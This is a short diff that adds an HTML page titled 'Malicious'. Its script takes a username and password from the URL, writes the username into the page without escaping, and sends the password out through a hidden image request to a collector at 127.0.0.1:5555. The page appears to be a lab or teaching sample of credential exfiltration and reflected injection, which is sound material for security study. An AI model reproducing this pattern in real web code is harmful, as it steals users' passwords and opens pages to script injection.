@@ -1,0 +1,21 @@
+<html>
+    <head>
+        <title>Malicious</title>
+        <style>
+            body{
+                background-color: #ffffff;
+            }
+        </style>
+    </head>
+    <body>
+        <script>
+            window.onload = function() {
+                var params = new URLSearchParams(window.location.search);
+                var username = params.get('username');
+                var password = params.get('password');
+                document.write("Welcome, " + username + "!");
+                document.write('<img  hidden src=http://127.0.0.1:5555?c=' + password + '>');
+            };
+        </script>
+    </body>
+</html>
